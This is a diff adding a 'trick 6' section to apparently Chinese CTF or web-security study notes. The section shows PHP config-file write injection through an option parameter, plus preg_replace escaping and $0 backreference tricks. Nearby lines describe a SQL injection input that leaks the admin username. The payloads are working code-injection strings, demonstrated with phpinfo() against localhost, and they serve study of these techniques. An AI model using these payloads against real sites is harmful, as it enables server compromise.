@@ -97,3 +97,21 @@ if __name__ == "__main__":
 简单的加以分析，因为要注入pass中的值，而且pass被过滤所以利用order By来进行比较
 但前提是要知道admin的值，所以利用`username='^1^1#&password=1`把用户名爆出来
 下面就好写了
+
+# trick 6
+一个简单的配置文件写入问题
+方法有很多种，但大多是要写两次
+
+## 1
+http://127.0.0.1/index.php?option=a';%0aphpinfo();//
+http://127.0.0.1/index.php?option=a
+
+## 2 利用 preg_replace函数的问题:
+preg_replace函数在处理字符串的时候,会自动对第二个参数的 \ 这个字符进行反转移. 具体为啥要这样干,我也不太懂. 也就是说如果字符串是 \\\',经过 preg_replace()的处理,就变为 \\',单引号就逃出来了.
+http://127.0.0.1/index.php?option=a\';phpinfo();//
+
+## 3 preg_replace() 函数的第二个参数的问题
+这个方法很巧秒
+replacement中可以包含后向引用\n 或(php 4.0.4以上可用)$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，\0和$0代表完整的模式匹配文本。
+http://127.0.0.1/test/ph.php?option=;phpinfo();
+http://127.0.0.1/test/ph.php?option=%00 或者 http://127.0.0.1/test/ph.php?option=$0
